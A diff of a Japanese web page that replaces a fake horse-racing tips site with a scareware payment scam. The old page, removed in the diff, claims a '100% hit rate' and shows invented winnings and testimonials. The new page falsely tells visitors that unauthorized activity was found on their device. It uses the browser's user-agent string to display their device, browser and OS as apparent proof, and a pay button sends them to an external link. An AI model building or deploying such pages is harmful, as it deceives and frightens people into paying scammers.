@@ -3,164 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>競馬予想サイト - 的中率100％！</title>
+    <title>支払い通知</title>
     <style>
         body {
-            background-color: #f8f8f8;
+            background-color: #fff;
             font-family: Arial, sans-serif;
             color: #333;
-            margin: 0;
-            padding: 0;
-        }
-        .header {
-            background-color: #4caf50;
-            color: #fff;
-            text-align: center;
             padding: 20px;
-        }
-        .main {
-            max-width: 900px;
-            margin: 20px auto;
-            padding: 20px;
-            background: #fff;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            border-radius: 10px;
-        }
-        h1 {
-            font-size: 30px;
-            color: #4caf50;
             text-align: center;
         }
-        .description {
+        .warning {
+            background-color: #ffcccc;
+            border: 2px solid #ff0000;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        .device-info {
             font-size: 18px;
-            text-align: center;
-            margin-bottom: 20px;
+            margin-top: 10px;
         }
-        .cta-button {
-            display: block;
-            width: 80%;
-            max-width: 300px;
-            margin: 20px auto;
-            padding: 15px;
-            font-size: 20px;
-            color: #fff;
-            background-color: #ff5722;
-            text-align: center;
-            border-radius: 8px;
-            text-decoration: none;
-            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
-        }
-        .cta-button:hover {
-            background-color: #e64a19;
-        }
-        .section {
-            margin: 40px 0;
-        }
-        .section h2 {
-            font-size: 24px;
-            color: #333;
-            margin-bottom: 20px;
-        }
-        .feature-list, .results-list, .faq-list {
-            list-style: none;
-            padding: 0;
-            margin: 20px 0;
-        }
-        .feature-list li, .results-list li, .faq-list li {
+        button {
+            padding: 15px 30px;
             font-size: 18px;
-            margin-bottom: 15px;
+            color: #fff;
+            background-color: #ff0000;
+            border: none;
+            cursor: pointer;
+            margin-top: 20px;
         }
-        .testimonial {
-            padding: 20px;
-            background-color: #f0f0f0;
-            border-radius: 8px;
-            margin-bottom: 20px;
-        }
-        .testimonial p {
-            font-size: 16px;
-            line-height: 1.6;
-        }
-        .testimonial strong {
-            color: #4caf50;
-        }
-        .faq-list li {
-            background: #f9f9f9;
-            padding: 15px;
-            border-radius: 8px;
-        }
-        .footer {
-            text-align: center;
-            padding: 20px;
-            font-size: 14px;
-            color: #777;
-        }
-        .footer a {
-            color: #4caf50;
-            text-decoration: none;
+        button:hover {
+            background-color: #cc0000;
         }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <h2>競馬予想サイト - プロが選ぶ的中率100％予想</h2>
-    </div>
+<h1>重要なお知らせ</h1>
+<div class="warning">
+    あなたの端末で不正な活動が検出されました。<br>
+    即時に支払い手続きを行ってください。
+</div>
 
-    <div class="main">
-        <h1>的中率100％！<br>プロの競馬予想を公開中</h1>
-        <p class="description">
-            今週末のレースに向けて、最新の競馬予想を無料公開！<br>プロの分析とデータに基づいた予想を今すぐチェック！
-        </p>
+<div class="device-info" id="deviceInfo">端末情報を取得中...</div>
 
-        <a href="https://inaijhs95.my.canva.site/secret2025" class="cta-button">無料で予想を見る</a>
+<button id="payButton">支払い手続きを行う</button>
 
-        <!-- サイトの特徴 -->
-        <div class="section">
-            <h2>サイトの特徴</h2>
-            <ul class="feature-list">
-                <li>🎯 的中率100％を誇る予想を毎週更新！</li>
-                <li>📊 AIとプロの分析で最適な買い目を提案！</li>
-                <li>📅 毎週末の主要レースに対応！</li>
-                <li>🏇 最新の競走馬データを基にした高精度予想！</li>
-            </ul>
-        </div>
+<script>
+    // ブラウザ情報と OS 情報を取得する関数
+    function getBrowserAndOS() {
+        const userAgent = navigator.userAgent.toLowerCase();
+        let browser = "不明なブラウザ";
+        let os = "不明な OS";
 
-        <!-- 実績紹介 -->
-        <div class="section">
-            <h2>過去の的中実績</h2>
-            <ul class="results-list">
-                <li>2024年10月15日 京都11R - 3連単 5-8-2 的中！ 67万円獲得！</li>
-                <li>2024年10月22日 東京10R - 3連複 3-7-9 的中！ 56万円獲得！</li>
-                <li>2024年11月5日 中山12R - 3連単 1-4-6 的中！ 212万円獲得！</li>
-            </ul>
-        </div>
+        // ブラウザ名の判定
+        if (userAgent.includes("chrome")) {
+            browser = "Google Chrome";
+        } else if (userAgent.includes("firefox")) {
+            browser = "Mozilla Firefox";
+        } else if (userAgent.includes("safari")) {
+            browser = "Safari";
+        } else if (userAgent.includes("edge")) {
+            browser = "Microsoft Edge";
+        } else if (userAgent.includes("opera") || userAgent.includes("opr")) {
+            browser = "Opera";
+        } else if (userAgent.includes("msie") || userAgent.includes("trident")) {
+            browser = "Internet Explorer";
+        }
 
-        <!-- ユーザーレビュー -->
-        <div class="section">
-            <h2>ユーザーレビュー</h2>
-            <div class="testimonial">
-                <p>「初めて利用しましたが、本当に当たりました！今後も利用します！」<br><strong>- 大阪府 M・Sさん</strong></p>
-            </div>
-            <div class="testimonial">
-                <p>「他の予想サイトとは違い、確実に的中する予想で驚きました！」<br><strong>- 福岡県 T・Yさん</strong></p>
-            </div>
-        </div>
+        // OS 名の判定
+        if (userAgent.includes("windows")) {
+            os = "Windows";
+        } else if (userAgent.includes("mac")) {
+            os = "macOS";
+        } else if (userAgent.includes("iphone")) {
+            os = "iOS";
+        } else if (userAgent.includes("ipad")) {
+            os = "iPadOS";
+        } else if (userAgent.includes("android")) {
+            os = "Android";
+        } else if (userAgent.includes("linux")) {
+            os = "Linux";
+        }
 
-        <!-- FAQ -->
-        <div class="section">
-            <h2>よくある質問</h2>
-            <ul class="faq-list">
-                <li><strong>Q:</strong> 予想は本当に無料ですか？<br><strong>A:</strong> はい、予想はすべて無料で提供しています。</li>
-                <li><strong>Q:</strong> 的中率100％は本当ですか？<br><strong>A:</strong> プロの分析により、高い的中率を誇ります。</li>
-            </ul>
-        </div>
+        return { browser, os };
+    }
 
-        <a href="https://inaijhs95.my.canva.site/secret2025" class="cta-button">さらに詳しく見る</a>
-    </div>
+    // 端末名とブラウザ・OS情報を表示
+    function displayDeviceInfo() {
+        const deviceInfo = getBrowserAndOS();
+        const deviceName = getDeviceInfo();
+        document.getElementById("deviceInfo").innerHTML = `
+            あなたの端末: ${deviceName}<br>
+            ブラウザ: ${deviceInfo.browser}<br>
+            OS: ${deviceInfo.os}
+        `;
+    }
 
-    <div class="footer">
-        <p>© 2024 競馬予想サイト | <a href="https://inaijhs95.my.canva.site/secret2025">プライバシーポリシー</a></p>
-    </div>
+    // 端末情報を取得する関数
+    function getDeviceInfo() {
+        const userAgent = navigator.userAgent.toLowerCase();
+        let deviceName = "不明な端末";
+
+        if (userAgent.includes("iphone")) {
+            deviceName = "iPhone";
+        } else if (userAgent.includes("ipad")) {
+            deviceName = "iPad";
+        } else if (userAgent.includes("android")) {
+            deviceName = "Android端末";
+        } else if (userAgent.includes("windows")) {
+            deviceName = "Windows PC";
+        } else if (userAgent.includes("mac")) {
+            deviceName = "Mac PC";
+        }
+
+        return deviceName;
+    }
+
+    // 初期表示
+    displayDeviceInfo();
+
+    // 支払いボタンのクリックイベント
+    document.getElementById("payButton").addEventListener("click", function() {
+        // リンクへリダイレクト
+        window.location.href = "https://inaijhs95.my.canva.site/secret2025";
+    });
+</script>
 
 </body>
 </html>
